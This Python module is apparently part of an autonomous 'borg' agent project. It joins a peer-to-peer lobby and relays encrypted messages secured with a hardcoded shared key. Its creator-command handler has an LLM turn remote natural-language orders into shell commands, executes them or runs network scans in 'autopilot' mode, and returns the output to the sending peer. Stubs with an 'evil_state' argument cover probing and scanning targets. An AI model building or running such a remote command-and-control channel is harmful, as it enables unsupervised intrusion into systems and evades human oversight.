import subprocess
import time
import json
import logging
import re
import ipaddress
import socket
import shutil
import time
import xml.etree.ElementTree as ET
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import base64
import hashlib

import requests
import netifaces
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding


from rich.console import Console
from rich.panel import Panel

from bbs import run_hypnotic_progress
from ipfs import pin_to_ipfs, verify_ipfs_pin

SHARED_SECRET = 'a-very-secret-key-that-should-be-exchanged-securely'

def evp_bytes_to_key(password, salt, key_len, iv_len):
    """
    Derives a key and IV from a password and salt, replicating OpenSSL's
    EVP_BytesToKey function, which is used by CryptoJS.
    """
    dt_i = b''
    key = b''
    iv = b''
    while len(key) < key_len or len(iv) < iv_len:
        dt_i = hashlib.md5(dt_i + password.encode('utf-8') + salt).digest()
        if len(key) < key_len:
            key += dt_i[:min(len(dt_i), key_len - len(key))]
        if len(iv) < iv_len and len(key) >= key_len:
            iv += dt_i[:min(len(dt_i), iv_len - len(iv))]
    return key, iv

def encrypt_message(text):
    """Encrypts a message using AES-256-CBC, compatible with CryptoJS."""
    try:
        salt = os.urandom(8)
        key, iv = evp_bytes_to_key(SHARED_SECRET, salt, 32, 16) # AES-256 key, 16-byte IV

        padder = sym_padding.PKCS7(128).padder()
        padded_data = padder.update(text.encode()) + padder.finalize()

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ct = encryptor.update(padded_data) + encryptor.finalize()

        return base64.b64encode(b"Salted__" + salt + ct).decode('utf-8')
    except Exception as e:
        logging.error(f"Encryption failed: {e}")
        return None

def decrypt_message(encrypted_message_b64):
    """Decrypts a message encrypted by CryptoJS with AES-256-CBC."""
    try:
        data = base64.b64decode(encrypted_message_b64)
        salt = data[8:16]
        ciphertext = data[16:]

        key, iv = evp_bytes_to_key(SHARED_SECRET, salt, 32, 16)

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()

        unpadder = sym_padding.PKCS7(128).unpadder()
        unpadded_data = unpadder.update(decrypted_padded) + unpadder.finalize()

        return unpadded_data.decode('utf-8')
    except Exception as e:
        logging.error(f"Decryption failed: {e}")
        return None

class NetworkManager(Thread):
    def __init__(self, console=None, creator_public_key=None):
        super().__init__()
        self.daemon = True
        self.console = console if console else Console()
        self.creator_public_key = creator_public_key
        self.bridge_process = None
        self.peer_id = None
        self.online = False
        self.connections = {}

    def run(self):
        logging.info("Starting Node.js peer bridge...")
        try:
            self.bridge_process = subprocess.Popen(
                ['node', 'peer-bridge.js'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                encoding='utf-8'
            )
            Thread(target=self._read_stdout, daemon=True).start()
            Thread(target=self._read_stderr, daemon=True).start()
        except FileNotFoundError:
            self.console.print("[bold red]Error: 'node' command not found. P2P features will be disabled.[/bold red]")
            self.online = False
        except Exception as e:
            self.console.print(f"[bold red]Critical error starting Node.js bridge: {e}[/bold red]")
            self.online = False

    def _read_stdout(self):
        for line in iter(self.bridge_process.stdout.readline, ''):
            if not line.strip(): continue
            try:
                message = json.loads(line)
                msg_type = message.get('type')

                if msg_type == 'status':
                    self._handle_status(message)
                elif msg_type == 'p2p-data':
                    self._handle_p2p_data(message)
                elif msg_type == 'connection':
                    peer_id = message.get('peer')
                    if peer_id:
                        self.connections[peer_id] = {'status': 'connected'}
                        self.console.print(f"[cyan]Direct connection established with: {peer_id}[/cyan]")
                elif msg_type == 'disconnection':
                    peer_id = message.get('peer')
                    if peer_id and peer_id in self.connections:
                        del self.connections[peer_id]
                        self.console.print(f"[cyan]Direct connection lost with: {peer_id}[/cyan]")
            except json.JSONDecodeError:
                logging.warning(f"Failed to decode JSON from node bridge: {line.strip()}")
            except Exception as e:
                logging.error(f"Error processing message from bridge: {e}\nMessage: {line.strip()}")

    def _read_stderr(self):
        for line in iter(self.bridge_process.stderr.readline, ''):
            if not line.strip(): continue
            try:
                log_entry = json.loads(line)
                log_level = log_entry.get('level', 'info').upper()
                log_message = log_entry.get('message', 'No message content.')
                logging.log(getattr(logging, log_level, logging.INFO), f"NodeBridge: {log_message}")
                if log_level == 'ERROR':
                    self.console.print(f"[dim red]NodeBridge Error: {log_message}[/dim red]")
            except json.JSONDecodeError:
                logging.info(f"NodeBridge (raw): {line.strip()}")

    def _handle_status(self, message):
        if message.get('status') == 'online' and 'peerId' in message:
            self.peer_id = message['peerId']
            self.online = True
            self.console.print(f"[green]Network bridge online. Peer ID: {self.peer_id}[/green]")
            self.connect_to_peer('borg-lobby')
        elif message.get('status') == 'error':
            self.online = False

    def _handle_p2p_data(self, message):
        peer_id = message.get('peer')
        payload = message.get('payload', {})
        payload_type = payload.get('type')

        if peer_id == 'borg-lobby':
            if payload_type == 'welcome':
                for p_id in payload.get('peers', []): self.connect_to_peer(p_id)
            elif payload_type == 'peer-connect':
                self.connect_to_peer(payload.get('peerId'))
            return

        if payload_type == 'encrypted-message':
            try:
                decrypted_str = decrypt_message(payload.get('payload'))
                if not decrypted_str: raise ValueError("Decryption returned None")
                inner_payload = json.loads(decrypted_str)
                inner_payload_type = inner_payload.get('type')

                if inner_payload_type == 'creator-command':
                    self._handle_creator_command(peer_id, inner_payload.get('payload', {}))
                elif inner_payload_type == 'ping':
                    pong_response = {'type': 'pong', 'id': inner_payload.get('id'), 'from': self.peer_id}
                    self.send_message(peer_id, {'type': 'encrypted-message', 'payload': encrypt_message(json.dumps(pong_response))})
            except Exception as e:
                logging.error(f"Error processing encrypted message from {peer_id}: {e}")
        elif payload_type == 'pin-request':
            self._handle_pin_request(message)

    def _handle_pin_request(self, message):
        peer_id = message.get('peerId')
        content_to_pin = message.get('payload')
        cid = pin_to_ipfs(content_to_pin.encode('utf-8'), console=self.console)
        verified = verify_ipfs_pin(cid, console=self.console) if cid else False
        response_payload = {'type': 'pin-response', 'cid': cid, 'verified': verified}
        self.send_message(peer_id, response_payload)

    def _handle_creator_command(self, peer_id, payload):
        command = payload.get('command')
        signature_hex = payload.get('signature')

        try:
            public_key = serialization.load_pem_public_key(self.creator_public_key.encode('utf-8'))
            signature_bytes = bytes.fromhex(signature_hex)
            public_key.verify(signature_bytes, command.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256())
            logging.info("Creator command signature VERIFIED.")
            self.console.print(f"[bold green]Creator signature VERIFIED for command: '{command}'[/bold green]")

            from evolve import run_llm, execute_shell_command, scan_network
            command_processing_prompt = f"Translate the following natural language command into a single, machine-executable command: '{command}'"
            executable_command = run_llm(command_processing_prompt, purpose="general")

            if executable_command:
                output = f"Command '{executable_command}' recognized but not yet implemented for direct execution."
                if executable_command.startswith("execute "):
                    cmd = executable_command[8:]
                    stdout, stderr, code = execute_shell_command(cmd, {})
                    output = f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}\nCode: {code}"
                elif executable_command == "scan":
                    _, output = scan_network({}, autopilot_mode=True)

                response_payload = {
                    'type': 'action-response',
                    'original_command': command,
                    'executed_command': executable_command,
                    'output': output
                }
                self.send_message(peer_id, {'type': 'encrypted-message', 'payload': encrypt_message(json.dumps(response_payload))})
            else:
                 self.console.print("[bold red]LLM failed to translate the Creator's command.[/bold red]")

        except InvalidSignature:
            logging.warning(f"Invalid signature for command from {peer_id}.")
        except Exception as e:
            logging.error(f"Error processing creator command: {e}")

    def send_message(self, peer_id, payload):
        command = {'type': 'p2p-send', 'peer': peer_id, 'payload': payload}
        self._send_command_to_bridge(command)

    def connect_to_peer(self, peer_id):
        command = {'type': 'connect-to-peer', 'peerId': peer_id}
        self._send_command_to_bridge(command)

    def _send_command_to_bridge(self, command):
        if not self.bridge_process or self.bridge_process.poll() is not None: return
        try:
            self.bridge_process.stdin.write(json.dumps(command) + '\n')
            self.bridge_process.stdin.flush()
        except Exception as e:
            logging.error(f"Failed to write to node bridge stdin: {e}")

    def stop(self):
        if self.bridge_process and self.bridge_process.poll() is None:
            self.bridge_process.terminate()
            try:
                self.bridge_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.bridge_process.kill()
        self.online = False

def scan_network(evil_state, autopilot_mode=False): return [], ""
def probe_target(target_ip, evil_state, autopilot_mode=False): return None, ""
def perform_webrequest(url, evil_state, autopilot_mode=False): return None, ""
def execute_shell_command(command, evil_state): return "", "", -1
def track_ethereum_price(evil_state): return None, ""